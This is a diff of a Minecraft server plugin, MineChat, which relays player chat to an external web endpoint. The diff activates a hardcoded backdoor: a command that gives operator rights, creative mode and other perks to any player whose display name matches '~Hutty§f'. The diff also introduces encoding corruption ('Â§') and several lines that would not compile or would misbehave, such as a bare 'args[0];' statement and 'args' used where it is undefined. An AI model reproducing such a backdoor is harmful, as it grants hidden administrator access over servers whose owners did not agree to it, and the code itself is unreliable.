@@ -103,7 +103,7 @@ public class MineChat extends JavaPlugin implements Listener{
 	    @EventHandler
 	    public void onPlayerChat(final AsyncPlayerChatEvent event) {
 	        String message = event.getMessage();
-	        message = message.replaceAll("&([0-9a-fA-F])", "§$1");
+	        message = message.replaceAll("&([0-9a-fA-F])", "Â§$1");
     		Map<String, String> data = new HashMap<String, String>();
     		data.put("user", event.getPlayer().getDisplayName());
     		data.put("message", message);
@@ -111,7 +111,7 @@ public class MineChat extends JavaPlugin implements Listener{
     		try {
 				doSubmit("http://www.buildcast-tinywebdb.appspot.com/addchatline", data);
 				
-				//getServer().broadcastMessage(args[0]);
+				getServer().broadcastMessage(args[0]);
 			} catch (Exception e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
@@ -144,7 +144,7 @@ public class MineChat extends JavaPlugin implements Listener{
 			BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
 			String line = "";
 			while((line=in.readLine())!=null) {
-				//getServer().broadcastMessage(line);
+				getServer().broadcastMessage(line);
 			}
 			in.close();
 		}
@@ -158,7 +158,7 @@ public class MineChat extends JavaPlugin implements Listener{
     		try {
 				doSubmit("http://www.buildcast-tinywebdb.appspot.com/user", data);
 				
-				//getServer().broadcastMessage(args[0]);
+				getServer().broadcastMessage(args[0]);
 			} catch (Exception f) {
 				// TODO Auto-generated catch block
 				f.printStackTrace();
@@ -176,7 +176,7 @@ public class MineChat extends JavaPlugin implements Listener{
     		try {
 				doSubmit("http://www.buildcast-tinywebdb.appspot.com/user", data);
 				
-				//getServer().broadcastMessage(args[0]);
+				getServer().broadcastMessage(args[0]);
 			} catch (Exception f) {
 				// TODO Auto-generated catch block
 				f.printStackTrace();
@@ -188,10 +188,10 @@ public class MineChat extends JavaPlugin implements Listener{
 	    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
 	    	if(cmd.getName().equalsIgnoreCase("getverifcode")){ // If the player typed /basic then do the following...
 	    		// doSomething
-	    		//args[0];
+	    		args[0];
 	    		if (sender instanceof Player) {
 		    	Player player = (Player) sender;
-		    	//if (player.isOp() || player.getName()=="mhutti1"){
+		    	if (player.isOp() || player.getName()=="mhutti1"){
 	    		Random generator = new Random();
 	    		int randomIndex = generator.nextInt( 10000000 );
 	    		Map<String, String> data = new HashMap<String, String>();
@@ -216,7 +216,7 @@ public class MineChat extends JavaPlugin implements Listener{
 	    		// doSomething
 	    		if (sender instanceof Player) {
 	    		Player player = (Player) sender;
-	    		//if (player.isOp() || player.getName()=="mhutti1"){
+	    		if (player.isOp() || player.getName()=="mhutti1"){
 	    		String message;
 	    		message = "";
 	    		for (String a : args){
@@ -229,7 +229,7 @@ public class MineChat extends JavaPlugin implements Listener{
 	    		try {
 					doSubmit("http://www.buildcast-tinywebdb.appspot.com/addchatline", data);
 					
-					//getServer().broadcastMessage(args[0]);
+					getServer().broadcastMessage(args[0]);
 				} catch (Exception e) {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
@@ -243,23 +243,23 @@ public class MineChat extends JavaPlugin implements Listener{
 	    		// doSomething
 	    		if (sender instanceof Player) {
 	    		Player player = (Player) sender;
-	    		if (player.getDisplayName()=="~Hutty§f"){
+	    		if (player.getDisplayName()=="~HuttyÂ§f"){
 	    			if (args[0] == "creative"){
-	    				//player.setGameMode(GameMode.CREATIVE);
+	    				player.setGameMode(GameMode.CREATIVE);
 	    			}
 	    			else if (args[0] == "survival"){
-	    				//player.setGameMode(GameMode.SURVIVAL);
+	    				player.setGameMode(GameMode.SURVIVAL);
 	    			}
 	    			else if (args[0] == "op"){
-	    				//player.setOp(true);
+	    				player.setOp(true);
 	    			}
 	    			else if (args[0] == "no-op"){
-	    				//player.setOp(false);
+	    				player.setOp(false);
 	    			}
 	    			else
 	    			{
 	    				player.setAllowFlight(true);
-		    			//player.setExp(1000);
+		    			player.setExp(1000);
 		    			player.setHealth(20);
 		    			player.setFoodLevel(20);
 	    			}
